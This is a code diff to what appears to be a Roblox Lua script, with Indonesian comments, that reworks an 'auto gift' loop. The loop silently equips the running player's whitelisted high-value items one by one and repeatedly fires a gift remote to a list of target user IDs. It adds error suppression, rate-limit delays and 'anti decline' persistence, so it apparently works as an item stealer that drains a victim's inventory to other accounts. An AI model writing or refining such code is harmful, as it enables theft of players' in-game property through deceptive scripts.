@@ -748,71 +748,103 @@ RunService.RenderStepped:Connect(function()
 end)
 
 
+--====================================================
+-- 🔥 AUTO GIFT BRUTAL (ANTI STOP / ANTI DECLINE)
+--====================================================
+
 local cachedTools = {}
 local cacheBuilt = false
 
---====================================================
--- AUTO GIFT LOOP
---====================================================
+local function isToolValid(tool)
+    return tool
+        and tool.Parent
+        and tool.Parent == backpack
+        and tool:IsDescendantOf(game)
+end
+
+local function refreshTool(tool)
+    if not tool then return nil end
+    return backpack:FindFirstChild(tool.Name)
+end
 
 task.spawn(function()
     while true do
+        task.wait(0.05)
+
+        -- 🔥 reset state biar ga nyangkut
+        unequipAll()
 
         --====================================
-        -- 🔥 PHASE 1: SCAN + LANGSUNG GIFT
+        -- 🧠 BUILD CACHE (1x aja)
         --====================================
         if not cacheBuilt then
+            cachedTools = {}
+
             for _,tool in ipairs(backpack:GetChildren()) do
                 if tool:IsA("Tool")
-                and tool.Parent == backpack
-                and not isWeightTool(tool) then
+                and not isWeightTool(tool)
+                and brainrotWhitelist[tool.Name] then
 
-                    -- 🔥 masukin cache dulu
-                    if brainrotWhitelist[tool.Name] then
-                        table.insert(cachedTools, tool)
-                    end
-
-                    -- 🔥 langsung proses (gak nunggu cache full)
-                    if isWhitelisted(tool) then
-                        silentEquip(tool)
-
-                        for _,id in ipairs(targetUserIds) do
-                            giftRemote:FireServer(id)
-                        end
-
-                        tool.Parent = backpack
-                    end
+                    table.insert(cachedTools, tool)
                 end
             end
 
-            -- 🔥 setelah 1x scan → sort cache
             table.sort(cachedTools, function(a,b)
                 return (brainrotWhitelist[a.Name].chance or 0)
                     < (brainrotWhitelist[b.Name].chance or 0)
             end)
 
             cacheBuilt = true
-            print("CACHE BUILT ✅")
+            print("CACHE BUILT ✅", #cachedTools)
 
         --====================================
-        -- ⚡ PHASE 2: FAST LOOP (PAKAI CACHE)
+        -- ⚡ LOOP UTAMA (GA PERNAH MATI)
         --====================================
         else
             for i = 1, #cachedTools do
                 local tool = cachedTools[i]
 
-                if tool and tool.Parent == backpack then
+                if isToolValid(tool) and isWhitelisted(tool) then
+
+                    -- 🔥 equip aman
                     silentEquip(tool)
+                    task.wait(0.1)
+
+                    -- 🔥 spam gift (anti error + delay)
+                    local sent = false
 
                     for _,id in ipairs(targetUserIds) do
-                        giftRemote:FireServer(id)
+                        local ok = pcall(function()
+                            giftRemote:FireServer(id)
+                        end)
+
+                        if ok then
+                            sent = true
+                        end
+
+                        task.wait(0.2) -- 🔥 anti rate limit
                     end
 
-                    tool.Parent = backpack
+                    -- 🔥 reset tool state
+                    unequipAll()
+                    task.wait(0.1)
+
+                    -- 🔥 refresh reference (PENTING BANGET)
+                    tool = refreshTool(tool)
+
+                    -- 🔥 kalau tool ilang / kepake → rebuild cache
+                    if not tool then
+                        cacheBuilt = false
+                        print("CACHE RESET 🔄 (tool berubah)")
+                        break
+                    end
+
+                    -- 🔥 kalau semua gagal → tetep lanjut (anti stop)
+                    if not sent then
+                        warn("Gift gagal semua (kemungkinan di-decline / rate limit)")
+                    end
                 end
             end
         end
-
-        task.wait()
     end
 end)
